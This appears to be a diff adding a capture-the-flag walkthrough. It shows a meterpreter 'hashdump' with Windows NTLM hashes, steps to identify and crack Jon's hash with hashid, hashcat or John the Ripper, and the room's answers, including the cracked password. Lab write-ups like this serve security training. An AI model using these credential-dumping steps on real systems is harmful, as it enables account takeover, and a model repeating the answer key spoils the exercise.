@@ -1,0 +1,33 @@
+cracking:
+
+*/............................................................................................................................................./*
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+______________________________________________________________________________________
+Copy the hash:
+┌──(root💀kali)-[~]
+└─# touch crack.hashes                                                  
+                                                                            
+┌──(root💀kali)-[~]
+└─# nano crack.hashes   
+_______________________________________________________________________________________
+Do the following for Jon:
+
+Check the hash type:
+hashid -m > crack.txt
+
+Crack it using hashcat, john the ripper or any hashcracker online.
+*/............................................................................................................................................./*
+
+Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
+--> Jon
+
+Copy this password hash to a file and research how to crack it. What is the cracked password?
+--> alqfna22 
+
+
+
+
+
